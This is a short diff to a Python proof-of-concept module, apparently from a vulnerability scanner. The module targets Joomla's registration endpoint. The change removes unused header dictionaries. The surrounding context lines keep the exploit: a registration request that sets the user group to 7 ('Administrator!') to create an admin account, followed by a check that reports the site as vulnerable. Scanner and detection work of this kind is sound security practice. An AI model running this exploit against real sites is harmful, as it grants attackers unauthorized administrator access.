@@ -54,12 +54,6 @@ class Poc(ABPoc):
                 'user[groups][]': (None,'7'),   #  Administrator!
                 token:(None,'1')
             }
-            head = {
-                'User-Agent': 'Mozilla/5.0',
-                #"Content-Type":"application/x-www-form-urlencoded"
-                "Content-Type":"application/data"
-            }
-
             r = s.post(self.target+'/index.php/component/users/?task=registration.register', files=data, allow_redirects=False)
             if 'index.php?option=com_users&view=registration' in r.headers['location']:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -94,12 +88,6 @@ class Poc(ABPoc):
                 'user[groups][]': (None,'7'),   #  Administrator!
                 token:(None,'1')
             }
-
-            head = {
-                'User-Agent': 'Mozilla/5.0',
-                "Content-Type":"application/x-www-form-urlencoded"
-            }
-
             r = s.post(self.target+'/index.php/component/users/?task=registration.register', files=data, allow_redirects=False)
 
             if 'index.php?option=com_users&view=registration' in r.headers['location']:
